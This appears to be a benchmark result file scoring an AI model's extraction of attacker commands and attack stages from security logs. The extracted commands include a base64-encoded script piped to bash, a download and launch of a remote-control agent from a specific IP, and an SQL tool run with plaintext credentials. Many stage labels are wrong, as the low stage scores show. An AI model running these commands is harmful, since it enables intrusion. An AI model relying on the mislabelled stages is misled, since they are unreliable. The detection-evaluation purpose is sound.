@@ -1,0 +1,86 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c \"del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "bash -c \"del /f /q c:\\windows\\logout.jsp\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$ip=\\",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attacker initially accessed the system through a compromised sandbox Linux instance. The malware downloaded additional tools using curl and executed them as root, gaining persistence. It also escalated privileges by deleting files within Tomcat directories, and conducted discovery operations via SQL queries. Finally, the malware gathered information about the target system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42772,
+      "completion_tokens": 6108,
+      "total_tokens": 48880,
+      "wall_clock_s": 74.617,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5555555555555556,
+      "recall": 0.5,
+      "f1": 0.5263157894736842,
+      "tp": 5,
+      "fp": 4,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.1111111111111111,
+      "recall": 0.14285714285714285,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 8,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42772,
+      "completion_tokens": 6108,
+      "total_tokens": 48880,
+      "wall_clock_s": 74.617,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
